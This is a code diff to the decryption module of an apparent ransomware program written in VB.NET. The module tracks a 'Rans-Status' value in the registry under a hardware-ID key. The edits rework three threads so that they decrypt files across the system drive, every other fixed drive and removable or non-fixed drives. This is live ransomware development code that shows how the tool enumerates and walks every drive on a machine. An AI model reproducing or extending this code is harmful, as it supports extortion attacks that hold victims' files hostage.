@@ -2,7 +2,7 @@
 Imports System.Security.Cryptography
 
 Public Class Decryption
-    Public P1 As String
+    Public Pass As String
     Private num
     Private userName As String = Environment.UserName
     Private C_DIR = Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 3)
@@ -22,13 +22,13 @@ Public Class Decryption
 
             My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\" + Main.HWID, "Rans-Status", "Decryption in progress...")
 
-            Dim T1 As New Threading.Thread(AddressOf Dec_Prog)
-            Dim T2 As New Threading.Thread(AddressOf Dec_Driver)
-            Dim T3 As New Threading.Thread(AddressOf Dec_User)
+            Dim T1 As New Threading.Thread(AddressOf System_Driver)
+            Dim T2 As New Threading.Thread(AddressOf Fix_Drivers)
+            Dim T3 As New Threading.Thread(AddressOf OtherDrivers)
 
-            T1.Start()
-            T2.Start()
-            T3.Start()
+            T1.Start(Pass)
+            T2.Start(Pass)
+            T3.Start(Pass)
 
 
             Do Until num = 3
@@ -36,7 +36,7 @@ Public Class Decryption
             Loop
 
             num = Nothing
-            P1 = Nothing
+            Pass = Nothing
             Threading.Thread.CurrentThread.Sleep(1000)
 
             My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\" + Main.HWID, "Rans-Status", "Decrypted")
@@ -52,29 +52,33 @@ Public Class Decryption
 
     End Sub
 
-    Public Sub Dec_User(ByVal password As String)
+    Private Sub System_Driver(ByVal password As String)
         On Error Resume Next
-        Dir_Dec(C_DIR & "Users\" & userName & "\", P1)
+        Dir_Dec(C_DIR, password)
         num += 1
     End Sub
 
-    Public Sub Dec_Driver(ByVal password As String)
+    Private Sub Fix_Drivers(ByVal password As String)
         On Error Resume Next
         For Each drive In Environment.GetLogicalDrives
             Dim Driver As DriveInfo = New DriveInfo(drive)
             If Driver.DriveType = DriveType.Fixed AndAlso Not Driver.ToString.Contains(C_DIR) Then
                 Dim DriverPath As String = drive
-                Dir_Dec(DriverPath, P1)
+                Dir_Dec(DriverPath, password)
             End If
         Next
         num += 1
     End Sub
 
-    Public Sub Dec_Prog(ByVal password As String)
+    Private Sub OtherDrivers(ByVal password As String)
         On Error Resume Next
-        If Privileges() = True Then
-            Dir_Dec(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) & "\", P1)
-        End If
+        For Each drive In Environment.GetLogicalDrives
+            Dim Driver As DriveInfo = New DriveInfo(drive)
+            If Not Driver.DriveType = DriveType.Fixed AndAlso Not Driver.ToString.Contains(C_DIR) Then
+                Dim DriverPath As String = drive
+                Dir_Dec(DriverPath, password)
+            End If
+        Next
         num += 1
     End Sub
 
